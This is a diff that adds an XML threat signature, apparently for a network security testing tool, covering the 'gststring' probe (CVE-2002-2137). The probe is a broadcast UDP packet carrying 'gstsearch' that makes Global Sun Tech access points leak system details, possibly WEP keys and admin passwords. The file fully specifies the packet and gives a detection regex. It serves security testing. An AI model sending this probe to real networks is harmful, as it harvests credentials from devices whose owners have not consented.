@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="gststring WAP Probe"/>
+    <EngDesc display="true" value="This threat causes vulnerable wireless access points to reply back with system details, possibly including WEP encryption keys and admin username and passwords.  This is done by sending a broadcast UDP packet with the string gstsearch set as the payload.  Vulnerable equipment includes any wireless access point created with Global Sun Tech chips."/>
+    <Intent display="true">
+      <item value="Scoping"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Wireless_AP"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Global_Sun_Tech"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ALL"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ALL"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2002-2137"/>
+    <bugtraqID display="true" value="6100"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464e04ba00a900fe009b00c97f7fc574"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725926957500000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X67\X73\X74\X73\X65\X61\X72\X63\X68"/>
+    <Created value="1139462059" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="FF:FF:FF:FF:FF:FF" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="FF" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="255.255.255.255" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="32774" destPort="$destPort" checksum="" length="" Payload="677374736561726368"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
